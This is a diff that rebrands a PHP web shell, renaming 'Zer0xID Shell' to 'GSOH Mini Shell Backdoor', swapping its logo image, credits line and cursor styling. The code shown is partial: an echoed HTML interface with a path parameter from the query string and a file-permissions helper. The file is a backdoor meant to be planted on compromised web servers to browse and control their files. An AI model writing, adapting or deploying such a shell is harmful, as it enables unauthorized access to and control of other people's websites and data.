@@ -11,7 +11,7 @@ echo '<!DOCTYPE HTML>
 <HTML>
 <HEAD>
 <link href="" rel="stylesheet" type="text/css">
-<title>Zer0xID Shell</title><link rel="SHORTCUT ICON"  href="http://i.imgur.com/QYUFm5u.png">
+<title>GSOH Mini Shell Backdoor</title><link rel="SHORTCUT ICON"  href="https://3.bp.blogspot.com/-HCnKNFhAj3U/Xjq6h4cW6RI/AAAAAAAAABM/hJoNmDJdCeEqW_6uEy-WQQ4MuySBmQcCwCLcBGAsYHQ/s1600/1580622765604.png">
 <style>
 body{
 font-family: "Courier", cursive;
@@ -50,8 +50,10 @@ border-radius:5px;
 }
 </style>
 </HEAD>
+<center>
+<img src="https://3.bp.blogspot.com/-HCnKNFhAj3U/Xjq6h4cW6RI/AAAAAAAAABM/hJoNmDJdCeEqW_6uEy-WQQ4MuySBmQcCwCLcBGAsYHQ/s1600/1580622765604.png" height="220px" width="220px" />
 <BODY>
-<H1><center>[!] Zer0xID Shell [!] </center></H1>
+<H1><center>GSOH Shell Backdoor</center></H1>
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>Current Path : ';
 if(isset($_GET['path'])){
@@ -234,7 +236,7 @@ echo "</center></td>
 echo '</table>
 </div>';
 }
-echo '<br /><font color="red"></font><font color="red">Recode by Zer0xID - CyberTeamrox</font>
+echo '<br /><font color="red"></font><font color="red">Mini Shell</font>
 </BODY>
 </HTML>';
 function perms($file){
@@ -290,8 +292,3 @@ $info .= (($perms & 0x0001) ?
 return $info;
 }
 ?>
-<style type='text/css'>body,a:hover{cursor:url(http://cur.cursors-4u.net/symbols/sym-1/sym46.cur),progress!important;}</style>
-
-
-
-
